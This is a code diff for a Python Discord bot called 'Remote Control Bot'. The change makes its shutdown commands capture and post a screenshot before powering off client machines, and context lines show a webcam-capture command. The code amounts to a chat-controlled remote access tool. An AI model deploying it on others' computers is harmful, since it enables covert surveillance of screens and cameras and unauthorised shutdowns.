@@ -179,13 +179,21 @@ async def shutdown(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
         user_id = interaction.user.id
-
-        embed = nextcord.Embed(description="Computer Shutdown", title="Status before interaction", timestamp=datetime.now(), colour=0xb400f5)
+        await interaction.response.send_message("Taking screenshot before shutdown...")
+        screenshot = pyautogui.screenshot()
+        x, y = pyautogui.position()
+        final_x = x - cursor_width // 2
+        final_y = y - cursor_height // 2
+        paste_position = (final_x, final_y)
+        screenshot.paste(cursor_image, paste_position, cursor_image)
+        screenshot.save(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'))
+        file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'), filename='status.png')
+        embed = nextcord.Embed(description="Status before shutdown", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
         embed.set_author(name="Remote Control Bot")
+        embed.set_image(url=f"attachment://status.png")
         embed.set_footer(text="Remote Control Bot v1.3")
 
-        await interaction.send(embed=embed)
-        await interaction.delete_original_message()
+        await interaction.send(embed=embed, file=file)
         os.system("shutdown /s /t 1")
 
 @client.slash_command(guild_ids=testServerId, description="Shuts down all clients")
@@ -193,12 +201,21 @@ async def shutdown_all(interaction : Interaction):
     category = interaction.channel.category
     user_id = interaction.user.id
 
-    embed = nextcord.Embed(description="Computer Shutdown", title="Status before interaction", timestamp=datetime.now(), colour=0xb400f5)
+    await interaction.response.send_message("Taking screenshot before shutdown...")
+    screenshot = pyautogui.screenshot()
+    x, y = pyautogui.position()
+    final_x = x - cursor_width // 2
+    final_y = y - cursor_height // 2
+    paste_position = (final_x, final_y)
+    screenshot.paste(cursor_image, paste_position, cursor_image)
+    screenshot.save(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'))
+    file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'), filename='status.png')
+    embed = nextcord.Embed(description="Status before shutdown", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
     embed.set_author(name="Remote Control Bot")
+    embed.set_image(url=f"attachment://status.png")
     embed.set_footer(text="Remote Control Bot v1.3")
 
-    await interaction.send(embed=embed)
-    await interaction.delete_original_message()
+    await interaction.send(embed=embed, file=file)
     os.system("shutdown /s /t 1")
 
 @client.slash_command(guild_ids=testServerId, description="Sends a screenshot of the client's view.")
@@ -222,7 +239,6 @@ async def status(interaction : Interaction):
         embed.set_footer(text="Remote Control Bot v1.3")
 
         await interaction.send(embed=embed, file=file)
-        await interaction.delete_original_message()
 
 @client.slash_command(guild_ids=testServerId, description="Sends a picture off of the client's camera.")
 async def take_picture(interaction : Interaction):
